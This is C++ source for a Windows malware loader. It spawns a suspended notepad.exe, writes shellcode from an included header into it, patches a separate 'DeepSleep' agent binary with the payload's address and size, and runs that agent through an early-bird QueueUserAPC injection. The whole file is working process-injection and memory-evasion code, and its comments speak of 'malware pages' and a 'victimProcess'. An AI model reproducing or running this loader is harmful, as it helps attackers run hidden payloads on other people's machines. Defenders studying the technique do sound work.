#include <windows.h>
#include <iostream>
#include <fstream>
#include <string.h>
#include "shellcode.h"


bool replaceBytes(byte* data, size_t data_size, const byte search[], const byte replace[]) {
	size_t i = 0;
	bool found = false;
	for (; i < data_size; i++) {
		if (memcmp(search, &(data[i]), (size_t)(sizeof(search))-1) == 0) {
			found = true;
			break;
		}
	}
	if (!found) {
		return false;
	}

	for (size_t j = 0; j < (size_t)sizeof(replace); j++) {
		data[j + i] = replace[j];
	}
	return true;
}

// This entire function is needed since we don't know the actual location of the allocated malware pages and size
// So we need to pass them as a variable to our deepsleep agent
SIZE_T prepare(IN LPVOID malwareAlloc, OUT byte** deepSleep) {
	std::fstream bin;
	const byte search[] = { 0x88, 0x88, 0x88 , 0x88 , 0x88 , 0x88 , 0x88 , 0x88 };
	const byte search2[] = { 0x99, 0x99, 0x99 , 0x99 , 0x99 , 0x99 , 0x99 , 0x99 };
	byte replace[sizeof(LPVOID)];
	memcpy(replace, &malwareAlloc, sizeof(LPVOID));
	 
	size_t shellcodeSizeT = sizeof(shellcode);
	byte* replace2 = static_cast<byte*>(static_cast<void*>(&shellcodeSizeT));

	bin.open(R"(DeepSleep.bin)", std::ios::out | std::ios::in | std::ios::binary);
	if (!bin.is_open()) {
		return 0;
	}

	bin.seekg(0, std::ios::end);
	size_t deepSleepSize = bin.tellg();
	bin.seekg(0, std::ios::beg);
	*deepSleep = new byte[deepSleepSize];
	bin.read((char*)*deepSleep, deepSleepSize);

	if (!replaceBytes(*deepSleep, deepSleepSize, search, replace)) {
		std::cout << "Can't replace 8s" << std::endl;
		goto exit;
		
	}
	if (!replaceBytes(*deepSleep, deepSleepSize, search2, replace2)) {
		std::cout << "Can't replace 9s" << std::endl;
		goto exit;
	}
	return deepSleepSize;
exit:
	bin.close();
	return 0;
}

int earlyBird() {
	byte* deepSleep;
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	DWORD oldProtect;

	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;
	
	LPVOID malwareAlloc = VirtualAllocEx(victimProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_NOACCESS);
	if (malwareAlloc == NULL) {
		return 0;
	}

	if (!VirtualProtectEx(victimProcess, malwareAlloc, sizeof(shellcode), PAGE_READWRITE, &oldProtect)) {
		return 0;
	}
	if (!WriteProcessMemory(victimProcess, malwareAlloc, shellcode , sizeof(shellcode), NULL)) {
		return 0;
	}

	size_t deepSleepSize = prepare(malwareAlloc, &deepSleep);

	LPVOID protectorAlloc = VirtualAllocEx(victimProcess, NULL, deepSleepSize, MEM_COMMIT | MEM_RESERVE, PAGE_NOACCESS);
	if (!protectorAlloc) {
		return 0;
	}
	if (!VirtualProtectEx(victimProcess, protectorAlloc, deepSleepSize, PAGE_READWRITE, &oldProtect)) {
		return 0;
	}
	
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)protectorAlloc;

	if (!WriteProcessMemory(victimProcess, protectorAlloc, deepSleep, deepSleepSize, NULL)) {
		return 0;
	}

	// Fix protections
	if (!VirtualProtectEx(victimProcess, malwareAlloc, sizeof(shellcode), PAGE_NOACCESS, &oldProtect)) {
		return 0;
	}
	if (!VirtualProtectEx(victimProcess, protectorAlloc, deepSleepSize, PAGE_EXECUTE_READ, &oldProtect)) {
		return 0;
	}

	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, 0);
	ResumeThread(threadHandle);
	return 1;
}

// WinMain
#ifdef _DEBUG
int main() {
#else
int APIENTRY WinMain(HINSTANCE, HINSTANCE, PSTR, int) {
#endif
	int success = earlyBird();
	std::cout << success;
	return 1;
}